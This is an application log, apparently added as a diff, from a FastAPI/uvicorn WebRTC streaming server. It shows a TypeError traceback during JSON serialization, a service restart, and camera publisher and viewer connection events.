+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]: ERROR:    Exception in ASGI application
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]: Traceback (most recent call last):
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/uvicorn/protocols/http/h11_impl.py", line 403, in run_asgi
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     result = await app(  # type: ignore[func-returns-value]
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/uvicorn/middleware/proxy_headers.py", line 60, in __call__
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     return await self.app(scope, receive, send)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/applications.py", line 1133, in __call__
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     await super().__call__(scope, receive, send)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/applications.py", line 113, in __call__
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     await self.middleware_stack(scope, receive, send)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/middleware/errors.py", line 186, in __call__
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     raise exc
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/middleware/errors.py", line 164, in __call__
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     await self.app(scope, receive, _send)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/middleware/cors.py", line 85, in __call__
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     await self.app(scope, receive, send)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/middleware/exceptions.py", line 63, in __call__
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     await wrap_app_handling_exceptions(self.app, conn)(scope, receive, send)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/_exception_handler.py", line 53, in wrapped_app
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     raise exc
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/_exception_handler.py", line 42, in wrapped_app
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     await app(scope, receive, sender)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/middleware/asyncexitstack.py", line 18, in __call__
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     await self.app(scope, receive, send)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/routing.py", line 716, in __call__
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     await self.middleware_stack(scope, receive, send)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/routing.py", line 736, in app
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     await route.handle(scope, receive, send)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/routing.py", line 290, in handle
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     await self.app(scope, receive, send)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/routing.py", line 123, in app
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     await wrap_app_handling_exceptions(app, request)(scope, receive, send)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/_exception_handler.py", line 53, in wrapped_app
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     raise exc
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/_exception_handler.py", line 42, in wrapped_app
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     await app(scope, receive, sender)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/routing.py", line 109, in app
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     response = await f(request)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/routing.py", line 411, in app
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     content = await serialize_response(
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/routing.py", line 277, in serialize_response
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     return jsonable_encoder(response_content)
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/encoders.py", line 297, in jsonable_encoder
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     encoded_value = jsonable_encoder(
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/encoders.py", line 311, in jsonable_encoder
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     jsonable_encoder(
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/encoders.py", line 341, in jsonable_encoder
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     return jsonable_encoder(
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/encoders.py", line 297, in jsonable_encoder
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     encoded_value = jsonable_encoder(
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/encoders.py", line 297, in jsonable_encoder
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     encoded_value = jsonable_encoder(
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/encoders.py", line 305, in jsonable_encoder
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]:     encoded_dict[encoded_key] = encoded_value
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]: TypeError: unhashable type: 'dict'
+Oct 22 10:13:26 ip-172-31-41-158 systemd[1]: Stopping WebRTC Streaming Server...
+Oct 22 10:13:26 ip-172-31-41-158 python3[5206]: INFO:     Shutting down
+Oct 22 10:13:27 ip-172-31-41-158 python3[5206]: INFO:     Waiting for application shutdown.
+Oct 22 10:13:27 ip-172-31-41-158 python3[5206]: INFO:     Application shutdown complete.
+Oct 22 10:13:27 ip-172-31-41-158 python3[5206]: INFO:     Finished server process [5206]
+Oct 22 10:13:27 ip-172-31-41-158 systemd[1]: webrtc.service: Deactivated successfully.
+Oct 22 10:13:27 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 22 10:13:27 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 30.744s CPU time.
+Oct 22 10:13:27 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 22 10:13:27 ip-172-31-41-158 python3[5261]: INFO:     Started server process [5261]
+Oct 22 10:13:27 ip-172-31-41-158 python3[5261]: INFO:     Waiting for application startup.
+Oct 22 10:13:27 ip-172-31-41-158 python3[5261]: INFO:     Application startup complete.
+Oct 22 10:13:27 ip-172-31-41-158 python3[5261]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 22 10:13:35 ip-172-31-41-158 python3[5261]: /publish: Access to cam01
+Oct 22 10:13:35 ip-172-31-41-158 python3[5261]: Receive Publisher Track: cam01, kind=video
+Oct 22 10:13:35 ip-172-31-41-158 python3[5261]: INFO:     121.141.19.79:65200 - "POST /publish HTTP/1.1" 200 OK
+Oct 22 10:15:41 ip-172-31-41-158 python3[5261]: publisher[cam01] state: connecting
+Oct 22 10:15:41 ip-172-31-41-158 python3[5261]: publisher[cam01] state: connected
+Oct 22 10:15:41 ip-172-31-41-158 python3[5261]: publisher[cam01] state: closed
+Oct 22 10:15:41 ip-172-31-41-158 python3[5261]: /publish: Access to cam01
+Oct 22 10:15:41 ip-172-31-41-158 python3[5261]: Receive Publisher Track: cam01, kind=video
+Oct 22 10:15:41 ip-172-31-41-158 python3[5261]: INFO:     121.141.19.79:65219 - "POST /publish HTTP/1.1" 200 OK
+Oct 22 10:15:50 ip-172-31-41-158 python3[5261]: publisher[cam01] state: connecting
+Oct 22 10:15:50 ip-172-31-41-158 python3[5261]: publisher[cam01] state: connected
+Oct 22 10:15:50 ip-172-31-41-158 python3[5261]: INFO:     121.141.19.79:59216 - "OPTIONS /viewer HTTP/1.1" 200 OK
+Oct 22 10:15:50 ip-172-31-41-158 python3[5261]: /viewer: target=cam01
+Oct 22 10:15:50 ip-172-31-41-158 python3[5261]: INFO:     121.141.19.79:59216 - "POST /viewer HTTP/1.1" 200 OK
+Oct 22 10:16:16 ip-172-31-41-158 python3[5261]: [10:15:50.692707] viewer state: connecting
+Oct 22 10:16:16 ip-172-31-41-158 python3[5261]: [10:15:50.955171] viewer state: connected
+Oct 22 10:16:16 ip-172-31-41-158 python3[5261]: INFO:     121.141.19.79:59324 - "GET /viewser_count HTTP/1.1" 404 Not Found
+Oct 22 10:16:22 ip-172-31-41-158 python3[5261]: INFO:     121.141.19.79:59352 - "GET /viewer_count HTTP/1.1" 404 Not Found
+Oct 22 10:16:30 ip-172-31-41-158 python3[5261]: INFO:     121.141.19.79:59389 - "GET /viewers_count HTTP/1.1" 200 OK
+Oct 22 10:16:50 ip-172-31-41-158 python3[5261]: INFO:     121.141.19.79:59479 - "GET /viewers_detail HTTP/1.1" 200 OK
+Oct 22 10:17:03 ip-172-31-41-158 python3[5261]: [10:17:00.902970] viewer state: closed
+Oct 22 10:17:03 ip-172-31-41-158 python3[5261]: INFO:     121.141.19.79:59536 - "GET /viewers_detail HTTP/1.1" 200 OK
+Oct 22 10:17:15 ip-172-31-41-158 python3[5261]: INFO:     121.141.19.79:59589 - "GET /viewers_count HTTP/1.1" 200 OK
+Oct 22 10:18:08 ip-172-31-41-158 python3[5261]: /viewer: target=cam01
+Oct 22 10:18:08 ip-172-31-41-158 python3[5261]: INFO:     121.141.19.79:59809 - "POST /viewer HTTP/1.1" 200 OK
+Oct 22 10:21:10 ip-172-31-41-158 python3[5261]: [10:18:08.581871] viewer state: connecting
+Oct 22 10:21:10 ip-172-31-41-158 python3[5261]: [10:18:09.980535] viewer state: connected
+Oct 22 10:21:10 ip-172-31-41-158 python3[5261]: INFO:     121.141.19.79:60560 - "GET /viewers_count HTTP/1.1" 200 OK
